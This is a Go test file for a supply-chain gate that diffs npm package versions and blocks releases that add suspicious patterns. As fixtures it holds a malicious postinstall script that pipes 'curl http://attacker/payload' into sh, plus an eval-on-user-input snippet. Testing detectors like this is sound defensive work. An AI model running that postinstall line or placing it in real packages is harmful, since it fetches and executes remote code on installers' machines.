package gate

import (
	"context"
	"io"
	"testing"

	"github.com/alessandro-bitetto/chaindora/internal/registries"
)

// versionDiffStub gives different tarball bytes per version.
type versionDiffStub struct {
	stubProbe
	tarballsByVersion map[string][]byte
}

func (v versionDiffStub) TarballURL(_ context.Context, _, version string) (string, error) {
	return "stub://" + version, nil
}
func (v versionDiffStub) FetchTarball(_ context.Context, url string, dst io.Writer) error {
	const prefix = "stub://"
	version := url[len(prefix):]
	data := v.tarballsByVersion[version]
	if data == nil {
		_, err := dst.Write(nil)
		return err
	}
	_, err := dst.Write(data)
	return err
}

func TestVersionDiff_ApprovesWhenNoNewPatterns(t *testing.T) {
	clean := buildTarball(t, map[string]string{
		"package.json": `{"name":"p","version":"1.0.1"}`,
		"index.js":     "module.exports = 42;",
	})
	v := &VersionBumpDiff{
		Probes: probesWith("npm", versionDiffStub{
			stubProbe: stubProbe{
				versions: []registries.VersionInfo{{Version: "1.0.0"}, {Version: "1.0.1"}},
			},
			tarballsByVersion: map[string][]byte{"1.0.0": clean, "1.0.1": clean},
		}),
		BlockAt: 3, WarnAt: 1,
	}
	r := v.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "p", Version: "1.0.1"})
	if r.Verdict != VerdictApprove {
		t.Errorf("identical-tree bump should Approve, got %v: %q", r.Verdict, r.Reason)
	}
}

func TestVersionDiff_BlocksWhenNewVersionAddsPostinstall(t *testing.T) {
	clean := buildTarball(t, map[string]string{
		"package.json": `{"name":"p","version":"1.0.0"}`,
		"index.js":     "module.exports = 42;",
	})
	malicious := buildTarball(t, map[string]string{
		"package.json": `{"name":"p","version":"1.0.1","scripts":{"postinstall":"curl http://attacker/payload | sh"}}`,
		"index.js":     "module.exports = 42;",
	})
	v := &VersionBumpDiff{
		Probes: probesWith("npm", versionDiffStub{
			stubProbe: stubProbe{
				versions: []registries.VersionInfo{{Version: "1.0.0"}, {Version: "1.0.1"}},
			},
			tarballsByVersion: map[string][]byte{"1.0.0": clean, "1.0.1": malicious},
		}),
		BlockAt: 3, WarnAt: 1,
	}
	r := v.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "p", Version: "1.0.1"})
	if r.Verdict != VerdictBlock {
		t.Errorf("postinstall added in new version should Block, got %v: %q", r.Verdict, r.Reason)
	}
}

func TestVersionDiff_NoPriorApproves(t *testing.T) {
	v := &VersionBumpDiff{
		Probes: probesWith("npm", stubProbe{
			versions: []registries.VersionInfo{{Version: "1.0.0"}},
		}),
		BlockAt: 3, WarnAt: 1,
	}
	r := v.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "p", Version: "1.0.0"})
	if r.Verdict != VerdictApprove {
		t.Errorf("first version should Approve, got %v", r.Verdict)
	}
}

func TestVersionDiff_PreservedPatternsDontCount(t *testing.T) {
	jsWithEval := `var x = userInput; eval(x);`
	v1 := buildTarball(t, map[string]string{
		"package.json": `{"name":"tpl","version":"1.0.0"}`,
		"compile.js":   jsWithEval,
	})
	v2 := buildTarball(t, map[string]string{
		"package.json": `{"name":"tpl","version":"1.0.1"}`,
		"compile.js":   jsWithEval,
	})
	v := &VersionBumpDiff{
		Probes: probesWith("npm", versionDiffStub{
			stubProbe: stubProbe{
				versions: []registries.VersionInfo{{Version: "1.0.0"}, {Version: "1.0.1"}},
			},
			tarballsByVersion: map[string][]byte{"1.0.0": v1, "1.0.1": v2},
		}),
		BlockAt: 3, WarnAt: 1,
	}
	r := v.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "tpl", Version: "1.0.1"})
	if r.Verdict != VerdictApprove {
		t.Errorf("pre-existing eval should not Warn on diff, got %v: %q", r.Verdict, r.Reason)
	}
}

func TestPatternSet_TakesMaxWeight(t *testing.T) {
	fs := []StaticFinding{
		{Pattern: "x", Weight: 1},
		{Pattern: "x", Weight: 3},
		{Pattern: "x", Weight: 2},
		{Pattern: "y", Weight: 2},
	}
	got := patternSet(fs)
	if got["x"] != 3 {
		t.Errorf("x: got %d, want 3 (max)", got["x"])
	}
	if got["y"] != 2 {
		t.Errorf("y: got %d, want 2", got["y"])
	}
}
